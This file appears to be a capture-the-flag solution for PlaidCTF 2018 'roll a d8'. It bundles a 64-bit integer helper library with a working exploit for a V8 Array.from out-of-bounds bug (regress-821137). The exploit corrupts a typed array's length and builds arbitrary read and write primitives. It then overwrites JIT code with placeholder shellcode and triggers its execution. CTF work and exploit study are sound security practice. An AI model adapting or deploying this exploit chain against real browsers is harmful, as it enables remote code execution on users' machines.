//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    this.lower = function() {
        return bytes[0] + 256 * bytes[1] + 256*256*bytes[2] + 256*256*256*bytes[3];
    };

    this.upper = function() {
        return bytes[4] + 256 * bytes[5] + 256*256*bytes[6] + 256*256*256*bytes[7];
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

// modified from https://github.com/LiveOverflow/lo_nintendoswitch/blob/master/poc1.html#L36
function gc() {
    var x = new Array(0x800);
    for(y = 0; y < x.length; y++) {
        x[y] = new Uint32Array(0x10000);
    }
    for(y = 0; y < x.length; y++) {
        x[y] = 0;
    }
}

// exploit for roll a d8, plaidctf 2018
// implementing chrome nday (regress-821137.js)
// https://github.com/v8/v8/blob/master/test/mjsunit/regress/regress-821137.js
// stub V8_Dcheck

let oobArray = [];

let maxSize = 0x2000;
let val = 1.0;
console.log(oobArray.length);
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    next() {
      this.counter += 1;
      if (this.counter > maxSize) {
        oobArray.length = 1;
        return {done: true};
      } else {
        return {value: 1.234, done: false};
      }
    }
  }
) });

// allocate the victim array
var victim = new Uint16Array(23);
var victim2 = new ArrayBuffer(25);

// allocate a function object to use for our shellcode
var victim_func = function(x, y) {
    return x + y;
};

// make sure it will be jitted
for(x = 0; x < 0x10; x++) {
    victim_func();
}

// trigger a gc to clean up the array made during the Array.from
// this will also move the victim and its 
gc();

// at this point the OldSpace heap is something like...
// <   oob array   >
// < ............. >
// <  arraybuffer  >
// < ............. >
// < backing store >
// < ............. >
// <  victim_func  >
// so we can directly pull out the array backing store pointer
// and length


// try to corrupt the typedarray length
x = 0;
while (x < 0x10) {
    if (oobArray[x] == 4.8805903192e-313) {
        // this is the length field 
        oobArray[x] = 1.0440219291549e-310; // 0x1338/2
    }
    if (oobArray[x] == 9.76118063844e-313) {
        // this is the bytelength field
        oobArray[x] = 1.0440219291549e-310; // 0x1338
    }
    x += 1;
}
// at this point, we should have corrupted our victim array's length
if (victim.length != 0x1338) {
    throw "couldn't corrupt victim length!";
}

// scan through the victim for the array buffer, which we will use for r64/w64
var backing_idx = -1;

// there is a whole lot of bugginess around this loop because of IC
x = 0;
while (x < 50) {
    console.log(x + ": " + victim[x].toString(16));
    if (victim[x] == 25) {
        console.log(victim[x]);
        // save off the guessed index for the backing store
        backing_idx = x + 1;
        break;
    }
    x += 1;
}

console.log("guessed backing idx: " + backing_idx);

function r64(addr) {
    // set the backing ptr of the victim array, but allow
    // the caller to not change the current address
    if (addr != null) {
        for(x = 0; x < 4; x++) {
            victim[backing_idx + x] = addr[2*x] + (addr[2*x+1] << 8);
            victim[backing_idx + 4 + x] = victim[backing_idx + x];
        }
    }

    // our view over the victim
    var victim_view = new Uint8Array(victim2);
    var mybytes = [];
    for (x = 0; x < 8; x++) {
        mybytes.push(victim_view[x]);
    }

    // read from victim array
    return new Int64(mybytes);
}

// try to find the JSFunction code pointer
var codebytes = [];
x = 0;
while (x < 100) {
    console.log(x + ": " + victim[x].toString(16));
    if (x >= 87 && x < 91) {
        codebytes.push(victim[x]);
    }
    x += 1;
}

// fix up bugginess from the broken r/w
var jitbuf = new Array(8);
jitbuf[2] = codebytes[1] & 0xFF;
jitbuf[3] = codebytes[1] >> 8;
jitbuf[4] = codebytes[2] & 0xFF;
jitbuf[5] = codebytes[2] >> 8;
jitbuf[6] = codebytes[3] & 0xFF;
jitbuf[7] = codebytes[3] >> 8;

function writen(addr, data) {
    // set the backing ptr of the victim array, but allow
    // the caller to not change the current address
    if (addr != null) {
        for(x = 0; x < 4; x++) {
            victim[backing_idx + x] = addr[2*x] + (addr[2*x+1] << 8);
            victim[backing_idx + 4 + x] = victim[backing_idx + x];
        }
    }
    // our view over the victim
    var victim_view = new Uint8Array(victim2);
    // write over it
    for(x = 0; x < data.length; x++) {
        console.log(victim_view[x].toString(16));
        victim_view[x] = data[x];
    }
}

// shellcode buffer
var sc = new Array(0x10);
sc.fill(0x41);
sc[0] = 0xcc;
sc[2] = 0xcc;

// we want to write somewhere near the end of the jitbuffer
jitbuf[4] += 6; // adds 0x60000

// we need to write 0x60 bytes ahead of our address
jitbuf[2] += 0x60;

writen(jitbuf, sc);

// do a pass to update the jitbuf pointer
var codebytes = [];
x = 0;
while (x < 100) {
    var y = victim[x];
    victim[x] = jitbuf[4] + (jitbuf[5] << 8);
    if (x != 89) {
        victim[x] = y;
    }
    x += 1;
}

console.log("------------------------------------------");

console.log("jumping to " + new Int64(jitbuf).toString(16));
// trigger shellcode execution
victim_func();

//readline();